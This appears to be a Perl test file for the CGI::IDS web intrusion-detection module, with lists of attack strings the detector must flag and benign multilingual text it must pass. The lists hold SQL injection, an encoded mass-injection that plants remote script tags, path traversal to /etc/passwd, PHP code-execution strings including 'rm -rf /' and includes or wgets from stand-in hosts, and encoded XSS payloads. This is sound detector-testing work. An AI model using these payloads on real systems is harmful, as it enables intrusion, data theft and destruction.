    5   => "aa'or column DIV 0 =0 #",
    6   => "aa'or column+(1)='1",
    7   => "aa'or 0!='0",
    8   => "aa'LIKE'0",
    9   =>  "aa'or id ='\'",
    10  =>  "1';declare @# int;shutdown;set @# = '1",
    11  =>  "1';declare @@ int;shutdown;set @@ = '1",
    12  =>  "asd' or column&&'1",
    13  =>  "asd' or column= !1 and+1='1",
    14  =>  "aa'!=ascii(1) or-1=-'1",
    15  =>  "a'IS NOT NULL or+1=+'1",
    16  =>  "aa'in('aa') or-1!='0",
    17  =>  "aa' or column=+!1 #1",
    18  =>  "aa' SOUNDS like+'1",
    19  =>  "aa' REGEXP+'0",
    20  =>  "aa' like+'0",
    21  =>  "-1'=-'+1",
    22  =>  "'=+'",
    23  =>  "aa' or stringcolumn= +!1 #1 ",
    24  =>  "aa' or anycolumn ^ -'1",
    25  =>  "aa' or intcolumn && '1",
    26  =>  "asd' or column&&'1",
    27  =>  "asd' or column= !1 and+1='1",
    28  =>  "aa' or column=+!1 #1",
    29  =>  "aa'IS NOT NULL or+1^+'0",
    30  =>  "aa'IS NOT NULL or +1-1 xor'0",
    31  =>  "aa'IS NOT NULL or+2-1-1-1 !='0",
    32  =>  "aa'|1+1=(2)Or(1)='1",
    33  =>  "aa'|3!='4",
    34  =>  "aa'|ascii(1)+1!='1",
    35  =>  "aa'|LOCALTIME*0!='1 ",
    36  =>  "asd' |1 != (1)#aa",
    37  =>  "' is 99999 = '",
    38  =>  "' is 0.00000000000 = '",
    39  =>  "1'*column-0-'0",
    40  =>  "1'-\@a or'1",
    41  =>  "a'-\@a=\@a or'1",
    42  =>  "aa' *\@var or 1 SOUNDS LIKE (1)|'1",
    43  =>  "aa' *\@var or 1 RLIKE (1)|'1 ",
    44  =>  "a' or~column like ~1|'1",
    45  =>  "'<~'",
    46  =>  "a'-1.and '1",
    );

my %testSQLIList5 = (
    0   => "aa'/1 DIV 1 or+1=+'1 ",
    1   => "aa'&0+1='aa",
    2   => "aa' like(0) + 1-- -a ",
    3   => "aa'^0+0='0",
    4   => "aa'^0+0+1-1=(0)-- -a",
    5   => "aa'<3+1 or+1=+'1",
    6   => "aa'\%1+0='0",
    7   => "'/1/1='",
    8   => " aa'/1 or '1",
    9   => " aa1' * \@a or '1 '/1 regexp '0",
    10  => " ' / 1 / 1 ='",
    11  => " '/1='",
    12  => " aa'&0+1 = 'aa",
    13  => " aa'&+1='aa",
    14  => " aa'&(1)='aa",
    15  => " aa'^0+0 = '0",
    16  => " aa'^0+0+1-1 = (0)-- -a",
    17  => " aa'^+-3 or'1",
    18  => " aa'^0!='1",
    19  => " aa'^(0)='0",
    20  => " aa' < (3) or '1",
    21  => " aa' <<3 or'1",
    22  => " aa'-+!1 or '1",
    23  => " aa'-!1 like'0",
    24  => " aa' % 1 or '1",
    25  => " aa' / '1' < '3",
    26  => " aa' / +1 < '3",
    27  => " aa' - + ! 2 != + - '1",
    28  => " aa' - + ! 1 or '1",
    29  => " aa' / +1 like '0",
    30  => " ' / + (1) / + (1) ='",
    31  => " aa' & +(0)-(1)='aa",
    32  => " aa' ^+ -(0) + -(0) = '0",
    33  => " aa' ^ + - 3 or '1",
    34  => " aa' ^ +0!='1",
    35  => " aa' < +3 or '1",
    36  => " aa' % +1 or '1",
    37  => "aa'or column*0 like'0",
    38  => "aa'or column*0='0",
    39  => "aa'or current_date*0",
    40  => "1'/column is not null - ' ",
    41  => "1'*column is not ".'\N'." - ' ",
    42  => "1'^column is not null - ' ",
    43  => "'is".'\N'." - '1",
    44  => "aa' is 0 or '1",
    45  => "' or MATCH username AGAINST ('+admin -a' IN BOOLEAN MODE); -- -a",
    46  => "' or MATCH username AGAINST ('a* -) -+ ' IN BOOLEAN MODE); -- -a",
    47  => "1'*\@a or '1",
    48  => "1'*null or '1",
    49  => "1'*UTC_TIME or '1",
    50  => "1'*null is null - '",
    51  => "1'*\@a is null - '",
    52  => "1'*\@\@version*-0%20=%20'0",
    53  => "1'*current_date rlike'0",
    54  => "aa'/current_date in (0) -- -a",
    55  => "aa' / current_date regexp '0",
    56  => "aa' / current_date != '1",
    57  => "1' or current_date*-0 rlike'1",
    58  => "0' / current_date XOR '1",
    60  => "'or not false #aa",
    61  => "1' * id - '0",
    62  => "1' *id-'0",
);

my %testSQLIList6 = (
    0 => "asd'; shutdown; ",
    1 => "asd'; select null,password,null from users; ",
    2 => "aa aa'; DECLARE tablecursor CURSOR FOR select a.name as c,b.name as d,(null)from sysobjects a,syscolumns b where a.id=b.id and a.xtype = ( 'u' ) and current_user = current_user OPEN tablecursor ",
    3 => "aa aa'; DECLARE tablecursor CURSOR FOR select a.name as c,b.name as d,(null)from sysobjects a,syscolumns b
                where a.id=b.id and a.xtype = ( 'u' ) and current_user = current_user
                OPEN tablecursor FETCH NEXT FROM tablecursor INTO \@a,\@b WHILE(\@a != null)
                \@query  = null+null+null+null+ ' UPDATE '+null+\@a+null+ ' SET id=null,\@b = \@payload'
                BEGIN EXEC sp_executesql \@query
                FETCH NEXT FROM tablecursor INTO \@a,\@b END
                CLOSE tablecursor DEALLOCATE tablecursor;
                and some text, to get pass the centrifuge; and some more text.",
    4 => "\@query  = null+null+null+ ' UPDATE '+null+\@a+ ' SET[  '+null+\@b+ ' ]  = \@payload'",
    5 => "asd' union distinct(select null,password,null from users)--a ",
    6 => "asd' union distinct ( select null,password,(null)from user )-- a ",
    7 => "'DECLARE%20\@S%20CHAR(4000);SET%20\@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));EXEC(\@S);';",
    8 => "asaa';SELECT[asd]FROM[asd]",
    9 => "asd'; select [column] from users ",
    10 => "0x31 union select @"."@"."version,username,password from users ",
    11 => "1 order by if(1<2 ,uname,uid) ",
    12 => "1 order by ifnull(null,userid) ",
    13 => "2' between 1 and 3 or 0x61 like 'a",
    14 => "4' MOD 2 like '0",
    15 => "-1' /ID having 1< 1 and 1 like 1/'1 ",
    16 => "2' / 0x62 or 0 like binary '0",
    17 => "0' between 2-1 and 4-1 or 1 sounds like binary '1 ",
    18 => "-1' union ((select (select user),(select password),1/1 from mysql.user)) order by '1 ",
    19 => "-1' or substring(null/null,1/null,1) or '1",
    20 => "1' and 1 = hex(null-1 or 1) or 1 /'null ",
    21 => "AND CONNECTION_ID()=CONNECTION_ID()",
    22 => "AND ISNULL(1/0)",
    23 => "MID(\@\@hostname, 1, 1)",
    24 => "CHARSET(CURRENT_USER())",
    25 => "DATABASE() LIKE SCHEMA()",
    26 => "COERCIBILITY(USER())",
    27 => "1' and 0x1abc like 0x88 or '0",
    28 => "'-1-0 union select (select `table_name` from `information_schema`.tables limit 1) and '1",
    29 => "null''null' find_in_set(uname, 'lightos' ) and '1",
    30 => "(case-1 when mid(load_file(0x61616161),12, 1/ 1)like 0x61 then 1 else 0 end) ",
    31 => CGI::IDS::urldecode('%27sounds%20like%281%29%20union%19%28select%191,group_concat%28table_name%29,3%19from%19information_schema.%60tables%60%29%23%28'),
    32 => "0' '1' like (0) and 1 sounds like a or true#1",
);

my %testDTList = (
    0   => '../../etc/passwd',
    1   => '\\\%windir%\\\cmd.exe',
    2   => '1;cat /e*c/p*d',
    3   => '%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00',
    4   => '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    5   => '/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini',
    6   => 'C:\\boot.ini',
    7   => '../../../../../../../../../../../../localstart.asp%00',
    8   => '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini',
    9   => '&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;',
    10  => '../../../../../../../../conf/server.xml',
    11  => '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    12  => 'dir/..././..././folder/file.php ',
);

my %testURIList = (
    0   => 'firefoxurl:test|"%20-new-window%20file:\c:/test.txt',
    1   => 'firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"',
    2   => 'aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"',
    3   => 'navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)',
    4   => 'res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210',
    5   => 'mailto:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat',
);

my %testRFEList = (
        0 => ';phpinfo()',
        1 => '@phpinfo()',
        2 => '"; <?php exec("rm -rf /"); ?>',
        3 => '; file_get_contents(\'/usr/local/apache2/conf/httpd.conf\');',
        4 => ';echo file_get_contents(implode(DIRECTORY_SEPARATOR, array("usr","local","apache2","conf","httpd.conf"))',
        5 => '; include "http://evilsite.com/evilcode"',
        6 => "; rm -rf /\0",
        7 => '"; $_a=(! \'a\') . "php"; $_a.=(! \'a\') . "info"; $_a(1); $b="',
        8 => '";
                        define ( _a, "0008avwga000934mm40re8n5n3aahgqvaga0a303") ;
                        if  ( !0) $c = USXWATKXACICMVYEIkw71cLTLnHZHXOTAYADOCXC ^ _a;
                        if  ( !0) system($c) ;//',
        9 => '" ; //
                        if (!0) $_a ="". str_rot13(\'cevags\'); //
                        $_b = HTTP_USER_AGENT; //
                        $_c="". $_SERVER[$_b]; //
                        $_a( `$_c` );//',
        10 => '"; //
                        $_c = "" . $_a($b);
                        $_b(`$_c`);//',
        11 => '" ; //
                        if  (!0) $_a = base64_decode ;
                        if  (!0) $_b = parse_str ; //
                        $_c = "" . strrev("ftnirp");
                        if  (!0)  $_d = QUERY_STRING; //
                        $_e= "" . $_SERVER[$_d];
                        $_b($_e); //
                        $_f = "" . $_a($b);
                        $_c(`$_f`);//',
        12 => '" ; //
                        $_y = "" . strrev("ftnirp");
                        if  (!0)    $_a = base64_decode ;
                        if  (!0)    $_b="" . $_a(\'cHdk\');
                        if (!0) $_y(`$_b`);//',
        13 => '";{ if (true) $_a  = "" . str_replace(\'!\',\'\',\'s!y!s!t!e!m!\');
                        $_a( "dir"); } //',
        14 => '";{ if (true) $_a  = "" . strtolower("pass");
                        if   (1) $_a.= "" . strtolower("thru");
                        $_a( "dir"); } //',
        15 => '";{if (!($_b[]++%1)) $_a[]  = system;
                        $_a[0]( "ls"); } //',
        16 => '";{if (pi) $_a[]  = system;
                        $_a[0]( "ls");  } //',
        17 => '";; //
                        if (!($_b[]  %1)) $_a[0]  = system;
                        $_a[0](!a. "ls");  //',
        18 => '; e|$a=&$_GET; 0|$b=!a .$a[b];$a[a](`$b`);//',
        19 => 'aaaa { $ {`wget hxxp://example.com/x.php`}}',
);

my %testUTF7List = (
    0   => '+alert(1)',
    1   => 'ACM=1,1+eval(1+name+(+ACM-1),ACM)',
    2   => '1+eval(1+name+(+1-1),-1)',
    3   => 'XSS without being noticed<a/href=da&#x74&#97:text/html&#59&#x63harset=UTF-7&#44+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAPAAvAHMAYwByAGkAcAB0AD4->test',
);

my %testBase64CCConverter = (
    0   => 'PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4==',
    1   => '<a href=dat&#x61&#x3atext&#x2fhtml&#x3b&#59base64a&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>Test</a>',
    2   => '<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>',
    3   => '<applet src="data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4" type=text/html>',
);

my %testDecimalCCConverter = (
    0   => '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#108;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#61;&#34;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#62;&#32;&#10;&#47;&#47;&#32;&#67;&#114;&#101;&#97;&#109;&#111;&#115;&#32;&#108;&#97;&#32;&#99;&#108;&#97;&#115;&#101;&#32;&#10;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#32;&#41;&#32;&#123;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#250;&#98;&#108;&#105;&#99;&#111;&#32;&#105;&#110;&#105;&#99;&#105;&#97;&#108;&#105;&#122;&#97;&#100;&#111;&#32;&#97;&#32;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#32;&#10;&#32;&#116;&#104;&#105;&#115;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#39;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#114;&#105;&#118;&#97;&#100;&#111;&#32;&#112;&#97;&#114;&#97;&#32;&#101;&#108;&#32;&#111;&#98;&#106;&#101;&#116;&#111;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#32;&#10;&#32;&#118;&#97;&#114;&#32;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#117;&#108;&#108;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#46;&#46;&#46;&#32;&#10;&#125;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#101;&#119;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#41;&#59;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#112;&#114;&#111;&#103;&#114;&#97;&#109;&#97;&#99;&#105;&#111;&#110;&#119;&#101;&#98;&#46;&#110;&#101;&#116;&#47;&#39;&#59;&#32;&#10;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#32;&#10;&#32;',
    1   => MIME::Base64::decode_base64('NjAsMTE1LDk5LDExNCwxMDUsMTEyLDExNiw2Miw5NywxMDgsMTAwKzEsMTE0LDExNiw0MCw0OSw0MSw2MCw0NywxMTUsOTksMTE0LDEwNSwxMTIsMTE2LDYy'),
);

my %testOctalCCConverter = (
    0   => '\\\47\\\150\\\151\\\47\\\51\\\74\\\57\\\163\\\143\\\162\\\151\\\160\\\164\\\76',
    1   => '\\\74\\\163\\\143\\\162\\\151\\\160\\\164\\\76\\\141\\\154\\\145\\\162\\\164\\\50\\\47\\\150\\\151\\\47\\\51\\\74\\\57\\\163\\\143\\\162\\\151\\\160\\\164\\\76',
);

my %testHexCCConverter = (
    0   =>  '&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29',
    1   =>  ';&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x3e;&#x20;&#x0a;&#x2f;&#x2f;&#x20;&#x43;&#x72;&#x65;&#x61;&#x6d;&#x6f;&#x73;&#x20;&#x6c;&#x61;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x65;&#x20;&#x0a;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x20;&#x29;&#x20;&#x7b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#xfa;&#x62;&#x6c;&#x69;&#x63;&#x6f;&#x20;&#x69;&#x6e;&#x69;&#x63;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x64;&#x6f;&#x20;&#x61;&#x20;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x20;&#x0a;&#x20;&#x74;&#x68;&#x69;&#x73;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x27;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x64;&#x6f;&#x20;&#x70;&#x61;&#x72;&#x61;&#x20;&#x65;&#x6c;&#x20;&#x6f;&#x62;&#x6a;&#x65;&#x74;&#x6f;&#x20;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x20;&#x0a;&#x20;&#x76;&#x61;&#x72;&#x20;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x75;&#x6c;&#x6c;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x2e;&#x2e;&#x2e;&#x20;&#x0a;&#x7d;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x29;&#x3b;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x70;&#x72;&#x6f;&#x67;&#x72;&#x61;&#x6d;&#x61;&#x63;&#x69;&#x6f;&#x6e;&#x77;&#x65;&#x62;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x27;&#x3b;&#x20;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x20;&#x0a;&#x20;',
    2   =>  '\\\x0000003c\\\x0000073\\\x0000063\\\x0000072\\\x0000069\\\x0000070\\\x0000074\\\x000003e\\\x0000061\\\x000006c\\\x0000065\\\x0000072\\\x0000074\\\x0000028\\\x0000032\\\x0000029\\\x000003c\\\x000002f\\\x0000073\\\x0000063\\\x0000072\\\x0000069\\\x0000070\\\x0000074\\\x000003e',
    3   =>  'x=&#x65&#x76&#x61&#x6c,y=&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29
                x(y)',
    4   =>  'j&#97vascrip&#x74&#58ale&#x72&#x74&#x28&#x2F&#x58&#x53&#x53&#x20&#x50&#x55&#x4E&#x43&#x48&#x21&#x2F&#x29',
);

my %testLDAPInjectionList = (
    0   => "*(|(objectclass=*))",
    1   => "*)(uid=*))(|(uid=*",
    2   => "*))));",
);

my %testJSONScanning = (
    json_value => '{"a":"b","c":["><script>alert(1);</script>", 111, "eval(name)"]}',
);

my %testForFalseAlerts = (
    0 => 'war bereits als Gastgeber automatisch für das Turnier qualifiziert. Die restlichen 15 Endrundenplätze wurden zwischen Juni
                    2005 und Mai 2007 ermittelt. Hierbei waren mit Ausnahme der UEFA-Zone die jeweiligen Kontinentalmeisterschaften gleichzeitig
                    das Qualifikationsturnier für die Weltmeisterschaft. Die UEFA stellt bei der Endrunde fünf Mannschaften. Die Teilnehmer wurden in
                    einer Qualifikationsphase ermittelt, die am 9. Juli 2005 startete und am 30. September 2006 endete. Hierbei wurden die 25 Mannschaften der Kategorie A in fünf
                    Gruppen zu je 5 Mannschaften eingeteilt, wobei sich die fünf Gruppensieger für die Endrunde qualifizierten. Das erste europäische Ticket löste Norwegen am 27.
                    August 2006. Am 24. September folgte Schweden, drei Tage später konnten sich auch der amtierende Weltmeister Deutschland und Dänemark für die Endrunde qualifizieren.
                    England sicherte sich am 30. September 2006 das letzte Ticket gegen Frankreich. Die Mannschaften der Kategorie B spielten lediglich um den Aufstieg in die A-Kategorie.
                    Dem südamerikanischen Fußballverband CONMEBOL standen zwei Startpätze zu. Sie wurden bei der Sudamericano Femenino 2006, welche vom 10. bis 26. November 2006
                    im argentinischen Mar del Plata ausgetragen wurde, vergeben. Argentinien gewann das Turnier überraschend vor Brasilien. Beide Mannschaften qualifizierten sich
                    für die Endrunde. Die zwei nordamerikanischen Teilnehmer wurden beim CONCACAF Women\'s Gold Cup 2006 in den Vereinigten Staaten ermittelt. Das Turnier fand in
                    der Zeit vom 19. bis zum 30. November 2006 in Carson und Miami statt. Sieger wurde das US-amerikanische Team vor Kanada. Die drittplatzierten Mexikanerinnen
                    spielten gegen den Asien-Vierten Japan um einen weiteren Startplatz, scheiterten aber in den Play-Off-Spielen. Die Afrikameisterschaft der Frauen wurde vom 28.
                    Oktober bis zum 11. November 2006 in Nigeria ausgetragen. Die Mannschaft der Gastgeber setzte sich im Finale gegen Ghana durch. Beide Mannschaften werden den
                    afrikanischen Fußballverband bei der WM vertreten. Die Asienmeisterschaft der Frauen fand im Juli 2006 in Australien statt. Neben den Chinesinnen, die sich mit
                    einem Sieg über den Gastgeber den Titel sicherten, qualifizierten sich zudem die Australierinnen sowie die drittplatzierten Nordkoreanerinnen für die Endrunde.
                    Japan setzte sich wie 2003 in den Play-Off-Spielen gegen Mexiko (2:0 und 1:2) durch. Ozeanien hat einen direkten Startplatz,
                    der bei der Ozeanischen Frauenfußballmeisterschaft im April 2007 vergeben wurde. Neuseeland bezwang Papua-Neuguinea mit 7:0 und sicherte sich damit
                    das Ticket für die Weltmeisterschaft.',
    1 => 'Thatcher föddes som Margaret Hilda Roberts i staden Grantham i Lincolnshire, England. Hennes far var Alfred Roberts, som ägde en speceriaffär i
                    staden, var aktiv i lokalpolitiken (och hade ämbetet alderman), samt var metodistisk lekmannapredikant. Roberts kom från en liberal familj men kandiderade?som då var
                    praxis i lokalpolitik?som oberoende. Han förlorade sin post som Alderman 1952 efter att Labourpartiet fick sin första majoritet i Grantham Council 1950. Hennes mor var
                    Beatrice Roberts, född Stephenson, och hon hade en syster, Muriel (1921-2004). Thatcher uppfostrades som metodist och har förblivit kristen under hela sitt liv.[1]
                    Thatcher fick bra resultat i skolan. Hon gick i en grammar school för flickor (Kesteven) och kom sedan till Somerville College, Oxfords universitet 1944 för att studera
                    Xylonite och sedan J. Lyons and Co., där hon medverkade till att ta fram metoder för att bevara glass. Hon ingick i den grupp som utvecklade den första frysta mjukglassen.
                     Hon var också medlem av Association of Scientific Workers. Politisk karriär mellan 1950 och 1970 [redigera] Vid valen 1950 och 1951 ställde Margaret Roberts upp i v
                    alkretsen Dartford, som var en säker valkrets för Labour. Hon var då den yngsta kvinnliga konservativa kandidaten någonsin. Medan hon var aktiv i det konservativa pa
                    ficerad som barrister 1953. Samma år föddes hennes tvillingbarn Carol och Mark. Som advokat specialiserade hon sig på skatterätt. Thatcher började sedan leta efter en
                    för Finchley i april 1958. Hon invaldes med god marginal i valet 1959 och tog säte i underhuset. Hennes jungfrutal var till stöd för hennes eget förslag om att tvinga
                    kommunala församlingar att hålla möten offentligt, vilket blev antaget. 1961 gick hon emot partilinjen genom att rösta för återinförande av bestraffning med ris. Hon
                    befordrades tidigt till regeringen som underordnad minister (Parliamentary Secretary) i ministeriet för pensioner och socialförsäktingar (Ministry of Pensions and
                    National Insurance) i september 1961. Hon behöll denna post tills de konservativa förlorade makten i valet 1964. När Sir Alec Douglas-Home avgick röstade Thatcher för
                    Edward Heath i valet av partiledare 1965. När Heath hade segrat belönades hon med att bli de konservativas talesman i bostads- och markfrågor. Hon antog den politik
                    som hade utvecklats av hennes kollega James Allason, att sälja kommunägda bostäder till deras hyresgäster. Detta blev populärt i senare val[2]. Hon flyttade till
                    skuggfinansgruppen efter 1966..',
    2 => "Results are 'true' or 'false'.",
    3 => "Choose between \"red\" and \"green\". ",
    4 => "SQL Injection contest is coming in around '1 OR '2 weeks.",
    5 => "select *something* from the menu",
    6 => '<![CDATA[:??]]>',
    7 => 'test_link => /app/search?op=search;keywords=john%20doe;',
    8 => '<xjxobj><e><k>insert</k><v>insert</v></e><e><k>errorh</k><v>error</v></e><e><k>hostname</k><v>ab</v></e><e><k>ip</k><v>10.2.2.22</v></e><e><k>asset</k><v>2</v></e><e><k>thresholdc</k><v>30</v></e><e><k>thresholda</k><v>30</v></e><e><k>rrd_profile</k><v></v></e><e><k>nat</k><v></v></e><e><k>nsens</k><v>1</v></e><e><k>os</k><v>Unknown</v></e><e><k>mac</k><v></v></e><e><k>macvendor</k><v></v></e><e><k>descr</k><v><![CDATA[&]]></v></e></xjxobj>',
    9 => 'Big fun! ;-) :-D :))) ;)',
   10 => '"hi" said the mouse to the cat and \'showed off\' her options',
   11 => 'eZtwEI9v7nI1mV4Baw502qOhmGZ6WJ0ULN1ufGmwN5j+k3L6MaI0Hv4+RlOo42rC0KfrwUUm5zXOfy9Gka63m02fdsSp52nhK0Jsniw2UgeedUvn0SXfNQc/z13/6mVkcv7uVN63o5J8xzK4inQ1raknqYEwBHvBI8WGyJ0WKBMZQ26Nakm963jRb18Rzv6hz1nlf9cAOH49EMiD4vzd1g==',
   12 => "'Reservist, Status: Stabsoffizier'",
   13 => '"European Business School (ebs)"',
   14 => 'Universität Karlsruhe (TH)',
   15 => 'Psychologie, Coaching und Training, Wissenserlangung von Führungskräften, Menschen bewegen, Direktansprache, Erfolg, Spaß, Positiv Thinking and Feeling, Natur, Kontakte pflegen, Face to Face Contact, Sport/Fitness (Fussball, Beachvolleyball, Schwimmen, Laufen, Krafttraining, Bewegungsübungen uvm.), Wellness & Beauty',
   16 => 'Großelternzeit - (Sachbearbeiter Lightfline)',
   17 => '{HMAC-SHA1}{48de2031}{8AgxrQ==}',
   18 => 'exchange of experience in (project) management and leadership • always interested in starting up business and teams • people with a passion • new and lost international contacts',
   19 => 'Highly mobile (Project locations: Europe & Asia), You are a team player',
   20 => '"Philippine Women\'s University (Honours)"',
   21 => ')))) да второй состав в отличной форме, не оставили парням ни единого шанса!!! Я думаю нас jedi, можно в первый переводить ))) ',
   22 => 'd3d3LmRlbW90eXdhdG9yeS5wbA==',
   23 => '0x24==',
   24 => '"Einkäuferin Zutaten + Stoffe"',
   25 => '"mooie verhalen in de talen: engels"',
);

#------------------------- CGI::IDS Tests -----------------------------------------------

# croak tests
print testmessage("croak tests");
eval {
    my $ids = new CGI::IDS(
        filters_file    => "$Bin/data/missing_filter_file.xml",
    );
};
like( $@, qr/(?:Error in _load_filters_from_xml while parsing).*(?:File does not exist)/, 'Croak if filter file is missing');

eval {
    my $ids = new CGI::IDS(
        filters_file    => "$Bin/data/test_filter_bad_xml.xml",
    );
};
like( $@, qr/(?:Error in _load_filters_from_xml while parsing)(?!.*(?:File does not exist))/, 'Croak if filter file has incorrect XML');

eval {
    my $ids = new CGI::IDS(
        filters_file    => "$Bin/data/test_filter_bad_regex.xml",
    );
};
like( $@, qr/Error in filter rule/, 'Croak if filter file contains incorrect RegEx' );

eval {
    my $ids = new CGI::IDS(
        filters_file    => "$Bin/data/test_filter_bad_data.xml",
    );
};
like( $@, qr/No IDS filter rules loaded/, 'Croak if filter file loading failed in other cases' );

eval {
    my $ids = new CGI::IDS(
        whitelist_file  => "$Bin/data/missing_param_whitelist.xml",
    );
};
like( $@, qr/_load_whitelist_from_xml.*File does not exist/, 'Croak if whitelist file is missing' );

eval {
    my $ids = new CGI::IDS(
        whitelist_file  => "$Bin/data/test_param_whitelist_bad_xml.xml",
    );
};
